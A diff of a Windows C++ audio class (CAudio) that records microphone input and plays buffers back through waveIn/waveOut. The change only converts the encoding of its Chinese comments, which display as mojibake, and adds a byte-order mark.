@@ -1,4 +1,4 @@
-// Audio.cpp: implementation of the CAudio class.
+ï»¿// Audio.cpp: implementation of the CAudio class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -73,7 +73,7 @@ CAudio::~CAudio()
         waveInClose(m_hWaveIn);
         WAIT (m_hThreadCallBack, 30);
         if (m_hThreadCallBack)
-            Mprintf("Ã»ÓĞ³É¹¦¹Ø±ÕwaveInCallBack.\n");
+            Mprintf("æ²¡æœ‰æˆåŠŸå…³é—­waveInCallBack.\n");
         TerminateThread(m_Thread, -999);
         m_Thread = NULL;
     }
@@ -111,18 +111,18 @@ BOOL CAudio::InitializeWaveIn()
                                    waveInCallBack, (LPVOID)this,
                                    CREATE_SUSPENDED, &dwThreadID);
 
-    //´ò¿ªÂ¼ÒôÉè±¸COM  1 Ö¸¶¨ÉùÒô¹æ¸ñ  2 Ö§³ÖÍ¨¹ıÏß³Ì»Øµ÷ »»»º³å
+    //æ‰“å¼€å½•éŸ³è®¾å¤‡COM  1 æŒ‡å®šå£°éŸ³è§„æ ¼  2 æ”¯æŒé€šè¿‡çº¿ç¨‹å›è°ƒ æ¢ç¼“å†²
     mmResult = waveInOpen(&m_hWaveIn, (WORD)WAVE_MAPPER,
                           &(m_GSMWavefmt.wfx), (LONG)dwThreadID, (LONG)0, CALLBACK_THREAD);
 
-    //m_hWaveIn Â¼Òô»ú¾ä±ú
+    //m_hWaveIn å½•éŸ³æœºå¥æŸ„
     if (mmResult != MMSYSERR_NOERROR) {
         return FALSE;
     }
 
-    //Â¼ÒôÉè±¸ ĞèÒªµÄÁ½¸ö»º³å
+    //å½•éŸ³è®¾å¤‡ éœ€è¦çš„ä¸¤ä¸ªç¼“å†²
     for (int i=0; i<2; ++i) {
-        m_InAudioHeader[i]->lpData = (LPSTR)m_InAudioData[i];   //m_lpInAudioData Ö¸ÕëÊı×é
+        m_InAudioHeader[i]->lpData = (LPSTR)m_InAudioData[i];   //m_lpInAudioData æŒ‡é’ˆæ•°ç»„
         m_InAudioHeader[i]->dwBufferLength = m_ulBufferLength;
         m_InAudioHeader[i]->dwFlags = 0;
         m_InAudioHeader[i]->dwLoops = 0;
@@ -133,7 +133,7 @@ BOOL CAudio::InitializeWaveIn()
     if (m_Thread!=NULL) {
         ResumeThread(m_Thread);
     }
-    waveInStart(m_hWaveIn);   //Â¼Òô
+    waveInStart(m_hWaveIn);   //å½•éŸ³
 
     m_bIsWaveInUsed = TRUE;
 
@@ -142,7 +142,7 @@ BOOL CAudio::InitializeWaveIn()
 
 LPBYTE CAudio::GetRecordBuffer(LPDWORD dwBufferSize)
 {
-    //Â¼Òô»ú
+    //å½•éŸ³æœº
     if(m_bIsWaveInUsed==FALSE && InitializeWaveIn()==FALSE) {
         return NULL;
     }
@@ -150,7 +150,7 @@ LPBYTE CAudio::GetRecordBuffer(LPDWORD dwBufferSize)
     SetEvent(m_hStartRecord);
     WaitForSingleObject(m_hEventWaveIn, INFINITE);
     *dwBufferSize = m_ulBufferLength;
-    return	m_InAudioData[m_nWaveInIndex];              //·µ³öÕæÕıÊı¾İ
+    return	m_InAudioData[m_nWaveInIndex];              //è¿”å‡ºçœŸæ­£æ•°æ®
 }
 
 DWORD WINAPI CAudio::waveInCallBack(LPVOID lParam)
@@ -171,7 +171,7 @@ DWORD WINAPI CAudio::waveInCallBack(LPVOID lParam)
             Sleep(1);
             This->m_nWaveInIndex = 1 - This->m_nWaveInIndex;
 
-            //¸üĞÂ»º³å
+            //æ›´æ–°ç¼“å†²
             MMRESULT mmResult = waveInAddBuffer(This->m_hWaveIn,
                                                 This->m_InAudioHeader[This->m_nWaveInIndex], sizeof(WAVEHDR));
             if (mmResult != MMSYSERR_NOERROR)
@@ -194,7 +194,7 @@ DWORD WINAPI CAudio::waveInCallBack(LPVOID lParam)
 
 BOOL CAudio::PlayBuffer(LPBYTE szBuffer, DWORD dwBufferSize)
 {
-    if (!m_bIsWaveOutUsed && !InitializeWaveOut())  //1 ÒôÆµ¸ñÊ½   2 ²¥ÒôÉè±¸
+    if (!m_bIsWaveOutUsed && !InitializeWaveOut())  //1 éŸ³é¢‘æ ¼å¼   2 æ’­éŸ³è®¾å¤‡
         return NULL;
 
     for (int i = 0; i < dwBufferSize; i += m_ulBufferLength) {
@@ -211,7 +211,7 @@ BOOL CAudio::InitializeWaveOut()
         return FALSE;
 
     for (int i = 0; i < 2; ++i)
-        memset(m_OutAudioData[i], 0, m_ulBufferLength);  //ÉùÒôÊı¾İ
+        memset(m_OutAudioData[i], 0, m_ulBufferLength);  //å£°éŸ³æ•°æ®
 
     MMRESULT	mmResult;
     mmResult = waveOutOpen(&m_hWaveOut, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)0, (LONG)0, CALLBACK_NULL);
